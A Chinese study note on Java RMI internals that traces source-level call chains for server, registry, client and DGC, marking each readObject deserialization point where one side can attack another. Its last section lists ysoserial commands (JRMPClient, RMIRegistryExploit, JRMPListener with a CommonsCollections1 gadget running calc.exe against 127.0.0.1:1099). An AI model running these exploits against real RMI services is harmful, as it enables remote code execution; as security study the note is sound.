---
title: java-rmi
tags:
  - java安全
date: 2025-03-03
---

rmi源码了解
照着unk的来了。然后我这边下载了源码，有些变量不是var的格式。
https://unk.org.cn/2024/02/12/RMI(1)/
# 基础
## 服务端
### 创建远程对象

```
new RemoteObjImpl();
    return UnicastRemoteObject#exportObject
    	new UnicastServerRef(port)
            new LiveRef(port)
                this((new ObjID()), port);		
                    this(objID, TCPEndpoint.getLocalEndpoint(port), true);
			super(liveRef)
        return exportObject(this,unicastServerRef)
			return UnicastServerRef#exportObject(RemoteObjImpl,)
				Remote stub = Util.createProxy(implClass, getClientRef(), forceStubUse)
					Util.createProxy
					//创建动态代理
					//RemoteObjectInvocationHandler
					//返回值是一个Remote的代理
					
				new Target(impl, this, stub, ref.getObjID(), permanent);
				
				LiveRef#exportObject
					TCPEndPoint#exportObject
						TCPTransport#exportObject
							listen();
							super.exportObject(target);
								ObjectTable.putTarget(target);
									DGCImpl#static
				return stub
```

### 创建注册中心

```
LocateRegistry.createRegistry(port);
	return new RegistryImpl(port)
		LiveRef lref = new LiveRef(id, port);
		this.setup(new UnicastServerRef(lref));
			UnicastServerRef#exportObject
				stub = Util.createProxy(implClass, getClientRef(), forceStubUse);
				setSkeleton(impl)
					Util.createSkeleton	//反射生成sun.rmi.registry.RegistryImpl_Skel
					
				Target target =new Target(impl, this, stub, ref.getObjID(), permanent);
				//后面和上面的一样
```

### 绑定stub

很简单

```
RegistryImpl.bindings.put(name, obj);

```

## 客户端

### 创建注册中心

```
LocateRegistry#getRegistry
    new LiveRef(new ObjID(ObjID.REGISTRY_ID),new TCPEndpoint(host, port, csf, null),false);
    new UnicastRef(liveRef)
    return (Registry) Util.createProxy(RegistryImpl.class, ref, false)
		return createStub(remoteClass, clientRef); // 获取的是RegistryImpl_Stub
```

### 从注册中心获取远程对象stub

```
RegistryImpl_Stub#lookup
	var3.writeObject(var1);  // 传参
	UnicastRef#newCall
	
	UnicastRef#invoke
		StreamRemoteCall#executeCall
			DataInputStream rd = new DataInputStream(conn.getInputStream());//和注册中心通信，获取stub的原始数据
			
			// 服务端攻击客户端
			case TransportConstants.ExceptionalReturn:in.readObject();
			
	var23 = (Remote)var6.readObject();  // 接收参数
	readObject //反序列化得到stub，注册中心攻击客户端
```

### 用stub调用远程对象方法

```
RemoteObjectInvocationHandler#invoke
	invokeRemoteMethod
		UnicastRef#invoke
			call = new StreamRemoteCall(conn, ref.getObjID(), -1, opnum);
			marshalValue(types[i], params[i], out)   // 序列化需要传的参数
			call.executeCall();
				this.in.readObject(); //服务端/注册中心攻击客户端
			unmarshalValue	//这个方法是用来判断值类型的。
				readObject() //若类型不是基础类型，则对远程方法的返回值readObject。服务端攻击客户端
```

## 注册中心
### 收到请求

在`RegistryImpl_Skel#dispatch`中根据调用的不同方法进入不同分支。

```
handleMessages
    serviceCall
		UnicastServerRef#dispatch
			oldDispatch
				RegistryImpl_Skel#dispatch //客户端/服务端攻击注册中心
					case 0: // bind(String, Remote)
					case 1: // list()
					case 2: // lookup(String)
						in.readObject(); // 对lookup的参数进行反序列化。客户端攻击服务端
					case 3: // rebind(String, Remote)
					case 4: // unbind(String)
```

攻击方式：客户端获取到registry后，lookup不传字符串，传一个对象，那么服务端就会反序列化该对象。

## 服务端
### 处理请求
```
UnicastServerRef#dispatch
	UnicastServerRef#unmarshalValue // 获取方法参数类型
	UnicastServerRef#unmarshalValue // 传输
```

## DGC
### 客户端

DGCImpl_Stub的生成

```
RegistryImpl_Stub#lookup
	ref.done
		StreamRemoteCall#done
			ConnectionInputStream#registerRefs
				DGCClient#registerRefs
					EndpointEntry#lookup
						new EndpointEntry//到这一步就生成了DGCImpl_Stub
```

DGCImpl_Stub具体方法的调用

```
//入口在EndpointEntry构造函数开启的新线程
RenewCleanThread#run
	进入循环
        makeDirtyCall
            DGCImpl_Stub#dirty
            	this.ref.newCall()//与远程DGC服务端通信
            	call.getOutputStream()//获取远程DGC服务端结果
                in.readObject //将结果反序列化。DGC客户端被DGC服务端攻击
```

### 服务端

处理客户端的dirty的时候，也会对客户端的数据readObject。

# 攻击
## Registry
```
handleMessages
    serviceCall
		UnicastServerRef#dispatch
			oldDispatch
				RegistryImpl_Skel#dispatch //客户端/服务端攻击注册中心
					case 0: // bind(String, Remote)
					case 1: // list()
					case 2: // lookup(String)
						in.readObject(); // 对lookup的参数进行反序列化。客户端攻击服务端
					case 3: // rebind(String, Remote)
					case 4: // unbind(String)
```
挖坑，待完成。
# yso

## 直接打服务端或者注册中心
```java
import Api.RemoteObj;  
import Api.RemoteObjImpl;  
  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class RMIServer {  
    public static void main(String[] args) throws Exception {  
        // 实例化远程对象  
        RemoteObj remoteObj = new RemoteObjImpl();  
        // 创建注册中心  
        Registry registry = LocateRegistry.createRegistry(1099);  
        // 绑定对象示例到注册中心  
        registry.bind("remoteObj", remoteObj);  
    }  
}
```
```
// 打服务端或者注册中心。
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections1 calc.exe
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1 calc.exe
```

## 直接打客户端
```java
Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  
RemoteObj remoteObj = (RemoteObj) registry.lookup("remoteObj");
```

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 calc.exe
```

## 通过反序列化打客户端
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient 127.0.0.1:1099 | base64 -w 0
```

开启恶意服务。然后通过反序列化即可触发。
```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 calc.exe
```

JRMPListener 这个反序列化以后会开启一个rmi的监听端口然后再去打服务端。
